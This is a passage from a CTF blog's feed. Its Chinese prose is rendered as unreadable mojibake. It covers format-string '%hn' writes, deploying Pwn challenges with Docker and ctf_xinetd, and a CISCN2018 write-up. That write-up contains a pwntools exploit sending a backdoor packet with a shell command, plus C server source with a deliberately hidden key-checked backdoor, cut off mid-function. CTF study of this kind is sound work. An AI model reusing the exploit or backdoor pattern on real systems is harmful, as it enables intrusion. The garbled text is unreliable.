punctuation">)</span></code></pre><p>æœ‰ç‚¹æ‡µï¼Œå¥½å¥½æ¶ˆåŒ–ã€‚</p><p>åŸæ¥å„å¤„çš„&amp;ffffï¼Œä¸å•å•æ˜¯ä¸ºäº†åŒ¹é…åé¢çš„%$hnè§£å¼•ç”¨å†™ä¸¤ä¸ªå­—èŠ‚ï¼Œè€Œæ˜¯ï¼Œè¿™ç§å†™çš„æ–¹å¼å¹¶ä¸æ˜¯è¦†ç›–ï¼Œè€Œæ˜¯å°†æ‰€æŒ‡å®šçš„å†…å­˜ç©ºé—´çš„å‰ä¸¤ä¸ªå­—èŠ‚æ¢æˆæˆ‘ä»¬è¦å†™çš„å€¼ã€‚</p><p>å¦‚<code>&quot;%&quot;+str(p_11&amp;0xffff)+&quot;c%6$hn\x00&quot;</code>ï¼Œåˆ™è¡¨ç¤ºå°†å‘æ ˆç©ºé—´åç§»é‡6çš„ä½ç½®çš„å‰ä¸¤ä¸ªå­—èŠ‚å†™æˆ<code>p_11&amp;0xffff</code>ï¼Œå³åŸæ•°æ®è‹¥ä¸º<code>0x12345678</code>ï¼Œç»è¿‡æ“ä½œåå˜ä¸ºäº†<code>0x12340000+p_11&amp;0xffff</code>ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²</title>
    <link href="http://www.yof3ng.xyz/2018/10/30/Pwn%E9%A2%98%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    <id>http://www.yof3ng.xyz/2018/10/30/Pwné¢˜ç¯å¢ƒéƒ¨ç½²/</id>
    <published>2018-10-30T15:15:43.000Z</published>
    <updated>2019-04-02T08:46:22.073Z</updated>
    
    <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²"><a href="#ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²"></a>ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²</h1><blockquote><p>ğŸ˜„dockeræ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œåœ¨CTFæ¯”èµ›ä¸­æˆ‘ä»¬å¯ä»¥ç»å¸¸é‡åˆ°é€šè¿‡dockeréƒ¨ç½²çš„webï¼Œæˆ–è€…Pwnç¯å¢ƒï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†ä¸€äº›æœåŠ¡éƒ¨ç½²åœ¨dockeré‡Œé¢ï¼Œç®¡ç†æ–¹ä¾¿ï¼Œå¹¶ä¸”è¾ƒä¸ºå®‰å…¨ã€‚</p><p>é€šè¿‡dockeræˆ‘ä»¬å¯ä»¥è‡ªå·±åˆ›å»ºé•œåƒï¼Œæˆ–è€…æ‹‰å–é•œåƒï¼Œæ¯”å¦‚è¯´<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">vulapps</a>ä¸Šé¢çš„é¶æœºï¼Œè¿˜æœ‰è¿™æ¬¡è¦è®²çš„ç®€å•çš„Pwnç¯å¢ƒéƒ¨ç½²æ¡†æ¶ã€‚</p><p>è¿™é‡Œæœ‰Angel_kittyå¸ˆå‚…å†™çš„ä¸€ä»½è¶…è¯¦ç»†dockeræ•™ç¨‹ã€‚<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html" target="_blank" rel="noopener">ä¼ é€é—¨</a></p></blockquote><h2 id="Docker-å®‰è£…"><a href="#Docker-å®‰è£…" class="headerlink" title="Docker å®‰è£…"></a>Docker å®‰è£…</h2><h3 id="1-aptå®‰è£…"><a href="#1-aptå®‰è£…" class="headerlink" title="1.aptå®‰è£…"></a>1.aptå®‰è£…</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> docker docker-compose</code></pre><h3 id="2-æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…"><a href="#2-æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…" class="headerlink" title="2.æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…"></a>2.æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…</h3><p><a href="https://download.docker.com/linux/debian/dists/" target="_blank" rel="noopener">ä¸‹è½½é“¾æ¥</a></p><p>ä¸‹è½½å®Œæˆåè¿›å…¥å®‰è£…æŠ¥æ‰€åœ¨çš„ç›®å½•ï¼Œå¹¶ä¸”æ‰§è¡Œä¸€ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#dbkg -i filename</span>dpkg -i docker-ce_17.03.1~ce-0~debian-jessie_amd64.deb</code></pre><h3 id="3-åˆ‡æ¢é•œåƒæº"><a href="#3-åˆ‡æ¢é•œåƒæº" class="headerlink" title="3.åˆ‡æ¢é•œåƒæº"></a>3.åˆ‡æ¢é•œåƒæº</h3><p>vim /etc/docker/daemon.json</p><pre class=" language-shell"><code class="language-shell">cat > /etc/docker/daemon.json << EOF{  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]}EOFservice docker restart</code></pre><h2 id="Docker-ç®€å•ä½¿ç”¨"><a href="#Docker-ç®€å•ä½¿ç”¨" class="headerlink" title="Docker ç®€å•ä½¿ç”¨"></a>Docker ç®€å•ä½¿ç”¨</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ æ¡å‘½ä»¤ç®€å•æµ‹è¯•ä¸€ä¸‹dockeræ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#å¯åŠ¨docker</span><span class="token function">service</span> docker startdocker images<span class="token comment" spellcheck="true">#hello-worldä¸ºå…¶è‡ªå¸¦çš„ä¸€ä¸ªimage</span>docker run hello-world</code></pre><p>ä»¥åŠä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ï¼Œå¯ä»¥è®°å½•ä¸€ä¸‹ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#æŸ¥çœ‹æœ¬åœ°å·²æœ‰é•œåƒ</span>docker images<span class="token comment" spellcheck="true">#è¿è¡Œé•œåƒå¹¶è¿›å…¥</span>docker run -i -t httpd /bin/bash<span class="token comment" spellcheck="true">#åå°è¿è¡Œé•œåƒï¼Œé•œåƒ8080ç«¯å£æ˜ å°„åˆ°ä¸»æœº80ç«¯å£</span>docker run -d -p 80:8080 httpd<span class="token comment" spellcheck="true">#è¿›å…¥å·²æœ‰å®¹å™¨</span>docker <span class="token function">exec</span> -it <span class="token punctuation">[</span>container-id<span class="token punctuation">]</span> /bin/bash<span class="token comment" spellcheck="true">#å…³é—­é•œåƒ</span>docker stop httpd<span class="token comment" spellcheck="true">#æŸ¥çœ‹å½“å‰æ­£åœ¨è¿è¡Œçš„é•œåƒ</span>docker <span class="token function">ps</span>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</code></pre><h1 id="Pwnéƒ¨ç½²æ¡†æ¶"><a href="#Pwnéƒ¨ç½²æ¡†æ¶" class="headerlink" title="Pwnéƒ¨ç½²æ¡†æ¶"></a>Pwnéƒ¨ç½²æ¡†æ¶</h1><blockquote><p>é€šè¿‡æ¡†æ¶æˆ‘ä»¬å¯ä»¥å¿«é€Ÿåœ°éƒ¨ç½²Pwné¢˜ç¯å¢ƒï¼Œè€Œä¸ç”¨æ“å¤ªå¤šçš„å¿ƒğŸ’—ã€‚</p></blockquote><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h2><p>æˆ‘ä»¬å¯ä»¥ä»githubä¸Šä¸‹è½½åˆ°<a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">ctf_xinetd</a> ï¼Œå®ƒæ˜¯å¼€æºçš„ä¸€ä¸ªé¡¹ç›®ã€‚</p><blockquote><p>#README.md</p><blockquote><p>A docker repository for deploying CTF challenges</p></blockquote><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>Put files to floder <code>bin</code>. Theyâ€™ll be copied to /home/ctf. <strong>Update the flag</strong> at the same time.</p><p>Edit <code>ctf.xinetd</code>. replace <code>./helloworld</code> to your command.</p><p>You can also edit <code>Dockerfile, ctf.xinetd, start.sh</code> to custom your environment.</p><h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><pre class=" language-bash"><code class="language-bash">docker build -t <span class="token string">"helloworld"</span> <span class="token keyword">.</span></code></pre><p>DO NOT use <em>bin</em> as challengeâ€™s name</p><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><pre class=" language-bash"><code class="language-bash">docker run -d -p <span class="token string">"0.0.0.0:pub_port:9999"</span> -h <span class="token string">"helloworld"</span> --name<span class="token operator">=</span><span class="token string">"helloworld"</span> helloworld</code></pre><p><code>pub_port</code> is the port you want to expose to the public network.</p><h2 id="Capture-traffic"><a href="#Capture-traffic" class="headerlink" title="Capture traffic"></a>Capture traffic</h2><p>If you want to capture challenge traffic, just run <code>tcpdump</code> on the host. Here is an example.</p><pre class=" language-bash"><code class="language-bash">tcpdump -w helloworld.pcap -i eth0 port pub_port</code></pre></blockquote><p>å…ˆç®€å•åœ°çœ‹ä¸€ä¸‹å®ƒçš„ç›®å½•ç»“æ„ï¼š</p><p><img src="https://i.loli.net/2018/10/30/5bd87b591ea60.png" alt=""></p><p>é¦–å…ˆå°†é¡¹ç›®ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”å°†å‡†å¤‡å¥½çš„pwné¢˜å’Œflagæ”¾å…¥binæ–‡ä»¶å¤¹ä¸­ã€‚<br><img src="https://i.loli.net/2018/10/30/5bd87ba1360b7.png" alt=""></p><p>ç„¶åæˆ‘ä»¬å»ä¿®æ”¹ctf.xinetdæ–‡ä»¶ä¸­çš„é…ç½®å‚æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/30/5bd87bda03b20.png" alt=""></p><p>ç„¶åæ ¹æ®readmeæ–‡æ¡£æˆ‘ä»¬å¯ä»¥è¿›è¡Œdockerå®¹å™¨çš„å»ºç«‹ï¼Œè¿è¡Œï¼Œä¹ƒè‡³æµé‡çš„ç›‘å¬ã€‚</p><h1 id="å›½èµ›Pwnä¹‹ä¸€"><a href="#å›½èµ›Pwnä¹‹ä¸€" class="headerlink" title="å›½èµ›Pwnä¹‹ä¸€"></a>å›½èµ›Pwnä¹‹ä¸€</h1><blockquote><p>è¿˜è®°å¾—ä»Šå¹´å›½èµ›æ˜¯è®©å„æ”¯è¿›äº†åŠå†³èµ›çš„é˜Ÿä¼è¿›è¡Œå‡ºé¢˜ï¼Œé¶æ ‡è®¾ç½®ï¼Œè¿™ä¸ªç¯èŠ‚è¢«ç§°ä½œ<code>Built it</code>ï¼Œä½†æ˜¯æˆ‘ä»¬å¤ªèœäº†ï¼Œæ²¡æœ‰å‡ºé¢˜ï¼Œä¹Ÿæ²¡æœ‰å‚åŠ çš„é‚£ä¸ªå®åŠ›ï¼ŒPS:æˆ‘ä¼šè¯´æˆ‘è¿<a href="https://github.com/sherlly/ciscn2018-pwn/tree/master/checker" target="_blank" rel="noopener">checker</a>éƒ½æ²¡çœ‹æ‡‚å—ï¼Œæ›´åˆ«è¯´è¿‡checkeräº†ã€‚</p><p>é™„ä¸ŠXp0inté˜Ÿä¼å›½èµ›å‡ºçš„é¢˜è§£ï¼Œä»¥åŠPwnç¯å¢ƒï¼Œå€Ÿä»¥å‚è€ƒã€‚</p></blockquote><blockquote><p>#WP</p><h2 id="CISCN2018-May-be-a-calculator"><a href="#CISCN2018-May-be-a-calculator" class="headerlink" title="CISCN2018 : May be a calculator?"></a>CISCN2018 : May be a calculator?</h2><h2 id="Principle"><a href="#Principle" class="headerlink" title="[Principle]"></a><strong>[Principle]</strong></h2><p>backdoor</p><h2 id="Environment"><a href="#Environment" class="headerlink" title="[Environment]"></a><strong>[Environment]</strong></h2><p>Ubuntu</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="[Tools]"></a><strong>[Tools]</strong></h2><p>gdbã€objdumpã€pythonã€pwntools</p><h2 id="Process"><a href="#Process" class="headerlink" title="[Process]"></a><strong>[Process]</strong></h2><p>è€ƒå¯ŸRPCç›¸å…³åè®®åŠé¢„ç•™åé—¨ï¼Œé€šè¿‡é€†å‘ä»£ç é€»è¾‘å¯ä»¥çœ‹åˆ°åœ¨ç¬¦åˆtypeä¸º0x6æ—¶ï¼Œéšè—äº†ä¸€ä¸ªåé—¨ï¼Œåœ¨åé—¨å‡½æ•°ä¸­é¦–å…ˆå¯¹æ¥æ”¶åˆ°çš„keyè¿›è¡Œæ£€æŸ¥ï¼Œé€šè¿‡å°†åŠ å¯†åçš„keyï¼ˆåŠ å¯†ç®—æ³•ä¸ºç®€å•çš„å¼‚æˆ–ï¼‰å’Œä¸€ä¸ªå›ºå®šå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œç›¸ç­‰åˆ™æ¥æ”¶çœŸæ­£çš„payloadï¼ŒåŠ å¯†ç®—æ³•å¦‚ä¸‹ï¼š</p><pre><code>void encrypt(char* key){  int i;  int k=0;  for(i=0;i&lt;36;i++)  {    key[i]=(key[i]^k)%256;    k+=23;  }}</code></pre><p>æœ€ç»ˆè„šæœ¬å¦‚ä¸‹ï¼š<br>exp.py</p><pre><code>from pwn import *import ospayload=&quot;cat flag&quot;key=&quot;12345678-6666-2333-5555-deadbeef1234&quot;backdoor=b&#39;RPCM\x00\x00\x00\x0c\x00\x00\x00\x06&#39;+p32(len(key))[::-1]+key+p32(len(payload))[::-1]+payloadr = remote(&#39;127.0.0.1&#39;, 1337)r.sendline(backdoor)print r.recvline()r.close()</code></pre></blockquote><p>calc.cç¨‹åºä»£ç å¦‚ä¸‹ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netdb.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;uuid/uuid.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/shm.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;map></span></span><span class="token macro property">#<span class="token directive keyword">define</span> BUF_SIZE 0x100</span><span class="token macro property">#<span class="token directive keyword">define</span> LENGTH 100</span>using namespace std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> top<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pool<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> stack<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> Data<span class="token punctuation">{</span>  string corr_id<span class="token punctuation">;</span>  string res<span class="token punctuation">;</span><span class="token punctuation">}</span> Data<span class="token punctuation">;</span><span class="token keyword">typedef</span> queue<span class="token operator">&lt;</span>Data<span class="token operator">></span> Q<span class="token punctuation">;</span><span class="token keyword">typedef</span> map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span> MQ<span class="token punctuation">;</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>Q<span class="token operator">></span><span class="token punctuation">:</span><span class="token punctuation">:</span>iterator it_find<span class="token punctuation">;</span>byte RECV_MAGIC<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> EVIL_INS<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"1%\x1dqiE\xbd\x99\x95\xf9\xd0\xcb\"\x06pjC\xb4\xb3\x80\xf9\xd6\xcf&lt;LZ7\t\xe6\xfe\xd7\xaf\xd1\xc5=\x11"</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">p32</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">(</span>value <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> pStr<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pTmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>pTmp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mark <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pStr<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> pStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            mark<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    pTmp<span class="token punctuation">[</span>mark<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> pTmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">myatoi</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">=</span> sum <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>buf <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        buf<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">read_str</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> t <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        buf<span class="token punctuation">[</span>t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    buf<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> t<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">input_pass</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'/'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\x00'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token number">-1</span><span class="token punctuation">;</span> i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c1 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> c2 <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c1 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c1 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c2 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c2 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c2 <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c2 <span class="token operator">==</span> <span class="token string">'/'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>c1 <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> c1 <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span>stack<span class="token operator">*</span> s<span class="token punctuation">,</span> 